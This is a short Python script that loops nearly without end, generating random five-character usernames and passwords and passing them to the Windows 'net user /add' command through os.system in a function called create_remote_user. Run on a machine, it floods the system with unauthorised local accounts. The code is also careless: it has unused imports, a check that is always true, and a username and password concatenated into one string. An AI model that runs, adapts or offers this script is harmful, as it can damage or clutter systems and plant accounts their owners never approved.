from hashlib import sha256
import hashlib
import random
import string
import os
list = []
letter = 'abcdefghijklmnopqrstuvwxyz0123456789'  
for z in range(1, 100000000000000) :
    i = 0
    number = random.randint(5, 5)
    def randStr(chars = string.ascii_uppercase + string.digits, N=number):
        return ''.join(random.choice(chars) for _ in range(N))
    user = randStr(chars=letter)
    password = randStr(chars=letter)
    list.append(user)
    if user in list:
        cwd = os.getcwd()
        def create_remote_user():
            command = 'net user /add ' + user + password
            os.system(command)
        create_remote_user()
